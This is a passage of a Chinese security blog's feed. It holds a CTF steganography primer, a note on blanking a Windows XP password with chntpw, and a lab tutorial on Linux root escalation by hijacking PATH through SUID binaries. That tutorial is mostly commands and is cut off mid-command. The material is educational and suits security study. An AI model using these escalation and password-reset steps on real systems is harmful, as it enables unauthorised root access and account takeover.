title="分析："></a>分析：</h4><p>加密短信方法不可取，因为潘主任会阅读传送的信息的内容，加密后的信息大概率会引起潘主任的怀疑，潘主任可以以此为依据对他们进行调查。因此林杨和余周周需要一种对通信过程隐藏的手段。<br>这么分析一下，可能很多同学对密码学和隐写术产生了困惑，什么时候用隐写，什么时候用密码？<br>密码学与隐写术要根据请情况的不同来选择。<br>密码学：试图通过对信息加密的方式，使信息变得无意义，继而使他人无法获得真正的信息。<br>隐写术：试图隐藏通信事件本身。<br>但他们都有相同目的都是为了针对第三方，在隐蔽性方面(总体上)隐写&gt;加密。因为加密后的文本通常为无意义文本，较易察觉(当然也存在诸如培根密码等密文为有意义文本的加密方<br>式),但在安全性上面(总体上)加密&gt;隐写,隐写方式或算法一但被识别，通常也就取得信息了，但是加密通常即使知道加密算法也无法解出明文(不考虑碰撞)。</p><p>现代数字隐写四大载体</p><ul><li>1.文本：字体、空格、标点、行间距等<br>2.图像：各类图片格式特征(png、jpg、bmp)<br>3.音频：mp3 stego、波形图、频谱图<br>4.视频：压缩视频、未压缩视频</li></ul><h3 id="关于CTF比赛"><a href="#关于CTF比赛" class="headerlink" title="关于CTF比赛"></a>关于CTF比赛</h3><p>在ctf比赛中隐写套路较为固定比赛工具较为成熟。<br>好处：通常题目难度较低，即使没有解题思路，依次尝试各个解法往往也能在没发现提示<br>的情况下找出问题所在。<br>坏处：容易形成思维定势，一旦题目考察方式不常规，往往容易无从下手，不知道从哪开<br>始去分析，失去独立发现问题和思考的能力。<br>通常作为MISC类题目的一个考察方向，(这里MISC泛指Misc &amp; Steganography &amp; forensic &amp; Crypto)，因为不作为单独分类，因此隐写术通常只是一道Misc题中的一部分，与其他考察方向<br>共同构成一道完整的Misc题。在国外CTF比赛中以计算机取证(Forensics)类的题目出现。</p><h2 id="CTF比赛中的典型隐写分析工具"><a href="#CTF比赛中的典型隐写分析工具" class="headerlink" title="CTF比赛中的典型隐写分析工具"></a>CTF比赛中的典型隐写分析工具</h2><h4 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h4><p>固件分析工具，常用作路由器逆向、后门分析，或识别二进制图像中的嵌入式文件和可<br>执行代码<br>常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令：binwalk -e firmware.bin——选项“-e&quot;和“--extract&quot;用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。</span><br><span class="line">命令：binwalk -Me firmware.bin——选项“-M&quot;和“--matryoshka&quot;用于根据magic签名扫描结果进行递归提取，仅对&quot;-e&quot;和“--dd&quot;选项有效。</span><br><span class="line">命令：binwalk -Me -d 5 firmware.bin——选项“-d&quot;和“--depth=&lt;int&gt;&quot;用于限制递归提取深度，默认深度为8，仅当“-M&quot;选项存在时有效。</span><br></pre></td></tr></table></figure></p><h4 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h4><p>图片通道查看器,常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Analyse下拉菜单：</span><br><span class="line">File Format：查看文件格式和参数信息，有时候flag会写在图片信息里</span><br><span class="line">Data Extract：数据提取，如LSB隐写等在这个选项中提取信息</span><br><span class="line">Stereogram solver：立体视图，可以左右移动控制偏移量</span><br><span class="line">Frame Broswer：逐帧浏览，如查看快速闪过的GIF图中的flag</span><br><span class="line">Image Combiner：图片结合，可以对两张图片做xor、add、sub等运算</span><br></pre></td></tr></table></figure></p><h4 id="StegDetect"><a href="#StegDetect" class="headerlink" title="StegDetect"></a>StegDetect</h4><p>数字图像隐写分析工具，主要针对JPEG,常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-q 仅显示可能包含隐藏内容的图像。</span><br><span class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-d 打印带行号的调试信息。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br></pre></td></tr></table></figure></p><h4 id="Foremost"><a href="#Foremost" class="headerlink" title="Foremost"></a>Foremost</h4><p>基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-V  - 显示版权信息并退出</span><br><span class="line">-t  - 指定文件类型.  (-t jpeg,pdf ...) </span><br><span class="line">-d  -打开间接块检测 (针对UNIX文件系统) </span><br><span class="line">-i  - 指定输入文件 (默认为标准输入) </span><br><span class="line">-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) </span><br><span class="line">-w  - 向磁盘写入审计文件，不写入任何检测到的文件</span><br><span class="line">-o  - 设置输出目录 (默认为为输出)</span><br><span class="line">-c  - 设置配置文件 (默认为 foremost.conf)</span><br><span class="line">-q  - 启用快速模式. 在512字节边界执行搜索.</span><br><span class="line">-Q  - 启用安静模式. 禁用输出消息. </span><br><span class="line">-v  - 详细模式. 向屏幕上记录所有消息。</span><br></pre></td></tr></table></figure></p><h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-t --radix=&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-e --encoding=&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, &#123;b,l&#125; = 16-bit, &#123;B,L&#125; = 32-bit</span><br></pre></td></tr></table></figure></p><h2 id="常见文件格式"><a href="#常见文件格式" class="headerlink" title="常见文件格式"></a>常见文件格式</h2><h3 id="what-is-文件格式"><a href="#what-is-文件格式" class="headerlink" title="what is 文件格式?"></a>what is 文件格式?</h3><p>文件格式（或文件类型）是指电脑为了存储信息而使用的对信息的特殊编码方式，是用于识别内部储存的资料。比如有的储存图片，有的储存程序，有的储存文字信息。每一类信息，都可以一种或多种文件格式保存在电脑存储中。每一种文件格式通常会有一种或多种扩展名可以用来识别，但也可能没有扩展名。扩展名可以帮助应用程序识别的文件格式。</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件头就是是位于文件开头的一段承担一定任务的数据。一般都在开头的部分。以jpg图片和zip压缩包文件为例。图6和图7分别是jpg图片的文件头以及jpg图片的结尾。</p><h3 id="txt格式"><a href="#txt格式" class="headerlink" title="txt格式"></a>txt格式</h3><p>txt是微软在操作系统上附带的一种文本格式，是最常见的一种文件格式 ，早在DOS时代应用就很多，主要存文本信息，即为文字信息，现在的操作系统大多使用记事本等程序保存，大多数软件可以查看，如记事本，浏览器等等。<br><img src="https://i.loli.net/2018/07/28/5b5c2ff8cadd7.jpg" alt="txt.jpg"></p><h4 id="doc-docx格式"><a href="#doc-docx格式" class="headerlink" title="doc/docx格式"></a>doc/docx格式</h4><p>doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，docx相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大。<br><img src="https://i.loli.net/2018/07/28/5b5c3256e7cdc.jpg" alt="doc和docx大小.jpg"><br>doc和docx中内容一样，docx比doc相比，体积更小。<br><img src="https://i.loli.net/2018/07/28/5b5c325808e21.jpg" alt="docx.jpg"><br>注意这里标记的pk，其实docx可以讲是一种zip文件。我们把后缀名改成zip试试。<br><img src="https://i.loli.net/2018/07/28/5b5c501148515.jpg" alt="docxzip.jpg"><br>可以看到，可以用解压软件打开。<br><img src="https://i.loli.net/2018/07/28/5b5c325811908.jpg" alt="doc.jpg"></p><h4 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h4><p>属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分。</p><p>拿张png的图片来举个例子．<br><img src="https://i.loli.net/2018/07/28/5b5c4ef373d27.png" alt="png"><br>丢到winhex中分析，对于一个PNG文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。PNG图片是有两种数据块的，一个是叫关键数据块，另一种是辅助数据块。正常的关键数据块，定义了4种标准数据块，每个PNG文件都必须包含它们。<br>一般格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件头 89 50 4E 47 0D 0A 1A 0A+数据块+数据块+数据块……</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/06/01/5b1158a6079eb.png" alt=""></p><h4 id="jpeg格式"><a href="#jpeg格式" class="headerlink" title="jpeg格式"></a>jpeg格式</h4><p>JPEG 是有损压缩格式，将像素信息用JPEG保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在0至100之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择 70 或 80 就足够了,png主要是块，而jpeg主要是以段的形式<br><img src="https://i.loli.net/2018/07/28/5b5c51e8274a8.jpg" alt="jpg"><br>一样拿张图片做栗子，注意jpg文件有些段是没有长度描述也没有内容，只有段标识和段类型。比如文件头和文件尾均属于这种段，段与段之间无论有多少 <code>FF</code>都是合法的，这些<code>FF</code>称为「填充字节」，必须被忽略掉。<br><img src="https://i.loli.net/2018/07/28/5b5c586860555.jpg" alt="文件头.jpg"><br><code>0xffd8</code>和 <code>0xffd9</code>为 JPG 文件的开始结束的标志<br><img src="https://i.loli.net/2018/07/28/5b5c5b13c92a9.jpg" alt="文件尾.jpg"></p><h4 id="bmp格式"><a href="#bmp格式" class="headerlink" title="bmp格式"></a>bmp格式</h4><p>是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成<br>文件头:前面两个字节一般42 4D，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量<br><img src="https://i.loli.net/2018/07/28/5b5c5bd8ec998.bmp" alt="1.bmp"></p><p><img src="https://i.loli.net/2018/07/28/5b5c5e8d58825.jpg" alt="bmp.jpg"><br>其中图像文件头。<code>0x4d42=’BM’</code>，表示是Windows支持的BMP格式。(注意：查ascii表B 0x42,M0x4d,bfType为两个字节，B为low字节，M为high字节所以bfType=<code>0x4D42</code>，而不是<code>0x424D</code>，请注意)<br><a href="https://baike.baidu.com/item/BMP/35116" target="_blank" rel="noopener">https://baike.baidu.com/item/BMP/35116</a></p><h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h4><p>gif就是我们经常看见的动图,比如各种表情包,从文件格式来讲它也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本.</p><p><img src="https://i.loli.net/2018/07/28/5b5c62100b597.gif" alt="gif"></p><p>我们还是用一张git图来举栗子</p><p><code>&lt;GIF数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录</code>,这个规则将<gif 数据流="">；实体定义如下。它必须以头部开始，头部后面接一个逻辑视屏实体，该实体要用其他规则来定义。最后，数据实体接结束符。数据实体后面的*表示数据实体可以在此位置出现0或多次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Gif 数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录</span><br><span class="line">&lt;；逻辑视屏&gt; ::= 逻辑视屏描述块 [全局色表]</span><br><span class="line">&lt;；数据&gt; ::= &lt;；成象块&gt; |&lt;；特殊用途块&gt;</span><br><span class="line">&lt;；成象块&gt; ::= [图象控制扩充] &lt;；成象块&gt;</span><br><span class="line">&lt;；成象块&gt; ::= &lt;；基于表的图象&gt; |纯文本扩充</span><br><span class="line">&lt;；基于表的图象&gt; ::= 图象描述符 [局部色表] 图象数据</span><br><span class="line">&lt;；特殊用途块&gt; ::= 应用扩充 |注释扩充</span><br></pre></td></tr></table></figure></gif></p><p><img src="https://i.loli.net/2018/07/29/5b5d69773c0d7.jpg" alt="gif.jpg"></p><h4 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h4><p>mp3格式是在音频隐写中常见的一种格式,mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位。<br>拿十三哥的音频来举个例子,使用audacity工具可以查看mp3的波形图,频谱图.<br><img src="https://i.loli.net/2018/07/28/5b5c612c4846e.jpg" alt="mp32.jpg"></p><p><img src="https://i.loli.net/2018/07/28/5b5c612c8f6ca.jpg" alt="mp3.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h2&gt;&lt;p&gt;做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>艰难的kali破解xp开机密码之路</title>
    <link href="https://threst.github.io/2018/06/15/kali%E7%A0%B4%E8%A7%A3xp%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/"/>
    <id>https://threst.github.io/2018/06/15/kali破解xp开机密码/</id>
    <published>2018-06-15T14:13:14.000Z</published>
    <updated>2018-06-15T14:30:58.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！</p><h2 id="win10pe初尝试"><a href="#win10pe初尝试" class="headerlink" title="win10pe初尝试"></a>win10pe初尝试</h2><p>拿到电脑那一刻，懵懂了，这哪是电脑，这根本就是十年前的古董啊！！病毒运行起来都卡，一大堆问题，本来是想直接用微pe盘破解（微pe真心好用），哪想这古董识别不了u盘</p><p>古董照片<br><img src="https://i.loli.net/2018/06/15/5b23c8cd36de6.jpg" alt=""></p><h2 id="kali大法好"><a href="#kali大法好" class="headerlink" title="kali大法好"></a>kali大法好</h2><p>正好威神那里有kali的启动盘，抱着试一试的想法插入了，啊！居然可以识别，直接设为u盘启动，开启kali<br>参考:<a href="https://blog.csdn.net/qq_31481187/article/details/52602454" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/52602454</a><br>先挂载windows的系统盘，打开终端，输入<br><code>cd /WINDOWS/system32/config</code></p><p>然后使用chntpw神器<br><code>chntpw -l SAM</code></p><p><img src="https://i.loli.net/2018/06/15/5b23c941d0cb6.jpg" alt=""></p><p>看见<code>Administrator</code>用户</p><p>输入：<br><code>chntpw -u Adminstrator SAM</code></p><p><img src="https://i.loli.net/2018/06/15/5b23c9a302c02.jpg" alt=""></p><p>要你选择<br><img src="https://i.loli.net/2018/06/15/5b23ca01d02bd.jpg" alt=""></p><h5 id="选择2解锁密码-最后退出的时候要需选择y，因为第一次选择1-退出输入n结果并没有改密码"><a href="#选择2解锁密码-最后退出的时候要需选择y，因为第一次选择1-退出输入n结果并没有改密码" class="headerlink" title="选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码"></a>选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码</h5><p>在输入<code>chntpw -u Adminstrator SAM</code>检查下<br><img src="https://i.loli.net/2018/06/15/5b23ca06ece30.jpg" alt=""><br>已经是blank了</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><img src="https://i.loli.net/2018/06/15/5b23caf35f99e.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！&lt;/p&gt;
&lt;h2 id=&quot;win10p
      
    
    </summary>
    
    
      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>利用 PATH 环境变量进行 Linux 提权</title>
    <link href="https://threst.github.io/2018/06/06/%E5%88%A9%E7%94%A8%20PATH%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%20Linux%20%E6%8F%90%E6%9D%83/"/>
    <id>https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/</id>
    <published>2018-06-06T03:13:14.000Z</published>
    <updated>2018-06-06T03:14:01.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高考加油"><a href="#高考加油" class="headerlink" title="高考加油"></a>高考加油</h1><h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>在解决了几个OSCP挑战之后，我决定写一篇关于用于Linux提权方法的文章，这对我们的渗透测试项目很有帮助。在本文中，我们将学习“操纵$PATH变量的各种方法”，以获得远程主机的根访问权，以及CTF challenges用于提权的$PATH漏洞的技术。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PATH是Linux和unix操作系统中的环境变量，它存储可执行程序的所有bin和sbin目录。当用户在终端上运行命令时，它对shell的请求是根据用户执行的命令在PATH变量的帮助下搜索可执行文件。超级用户通常还拥有/sbin和/usr/sbin条目，以便轻松执行系统管理命令。<br>使用echo命令查看用户路径。<br><code>echo $PATH</code><br>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</p><p>如果你注意到’.’在环境路径变量中，这意味着被记录的用户可以从当前目录执行二进制文件/脚本。</p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>目前，我们在<code>/home/raj</code>目录中，我们将创建一个名称为<code>/script</code>的新目录。现在在脚本目录中，我们将编写一个小c程序来调用系统二进制文件的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p><p>你可以在我们的演示中看到我们的demo.c调用ps系统二进制文件命令。</p><p><img src="https://p3.ssl.qhimg.com/t0159f31c3f43ed523c.png" alt=""></p><p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br></pre></td></tr></table></figure></p><h3 id="受害者的机虚拟机"><a href="#受害者的机虚拟机" class="headerlink" title="受害者的机虚拟机"></a>受害者的机虚拟机</h3><p>首先，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助下搜索具有SUID或4000权限的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>在上面的命令的帮助下，攻击者可以枚举任何可执行文件，这里我们还可以观察/home/raj/script/shell具有suid权限。</p><p><img src="https://p4.ssl.qhimg.com/t0144143a89451f6dbe.png" alt=""></p><p>然后我们进入/home/raj/script并看到一个可执行文件“shell”。我们运行这个文件，它看起来像正在运行ps，这是进程状态的一个真正的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><h4 id="Echo-Command"><a href="#Echo-Command" class="headerlink" title="Echo Command"></a>Echo Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h4 id="Copy-Command"><a href="#Copy-Command" class="headerlink" title="Copy Command"></a>Copy Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t018dafa3066188fc2b.png" alt=""></p><h4 id="Symlink-command"><a href="#Symlink-command" class="headerlink" title="Symlink command"></a>Symlink command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh ps</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>注意:符号链接也被称为符号链接，如果该目录具有完整的权限，它将成功地工作。在Ubuntu中，对于符号链接，我们给了/script目录的权限777。<br>因此，我们看到攻击者可以操纵环境变量路径来升级特权并获得根访问。</p><p><img src="https://p2.ssl.qhimg.com/t0111f758ef0283c98a.png" alt=""></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>重复上述步骤来配置您自己的环境中，我们将编写一个小c程序来调用系统二进制文件的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p><p>你可以在我们的demo.c正在调用id命令–它是系统二进制文件。</p><p><img src="https://p2.ssl.qhimg.com/t01372b3e8a96e1ca86.png" alt=""></p><p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell2</span><br><span class="line">chmod u+s shell2</span><br><span class="line">ls -la shell2</span><br></pre></td></tr></table></figure></p><h3 id="受害者的虚拟机"><a href="#受害者的虚拟机" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再一次，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助搜索具有SUID或4000权限的文件。在这里，我们还可以观察/home/raj/script/shell2具有suid权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>然后我们进入/home/raj/script，并看到一个可执行文件“shell2”。我们运行这个文件，它看起来像正在运行id。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./shell2</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01239db93de93649fa.png" alt=""></p><h4 id="Echo-command"><a href="#Echo-command" class="headerlink" title="Echo command"></a>Echo command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell2</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t01a9cb63912ec42e4b.png" alt=""></p><h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令从内部读取内容etc/passwd文件。然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o raj</span><br><span class="line">chmod u+s raj</span><br><span class="line">ls -la raj</span><br></pre></td></tr></table></figure></p><p><img src="https://p4.ssl.qhimg.com/t013c40160a33742c61.png" alt=""></p><h3 id="受害者的虚拟机-1"><a href="#受害者的虚拟机-1" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次破坏受害者的系统，然后转移到权限升级阶段，执行下面的命令来查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>在这里，我们还可以观察/home/raj/script/raj具有suid权限，然后进入/home/raj/script并看到一个可执行文件“raj”。所以当我们运行这个文件时，它就会输出etc/passwd文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">ls</span><br><span class="line">./raj</span><br></pre></td></tr></table></figure></p><h4 id="Nano-Editor"><a href="#Nano-Editor" class="headerlink" title="Nano Editor"></a>Nano Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">nano cat</span><br></pre></td></tr></table></figure><p>现在在终端输入/bin/bash当并保存它。</p><p><img src="https://p3.ssl.qhimg.com/t01799ac7f0d1dad684.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al 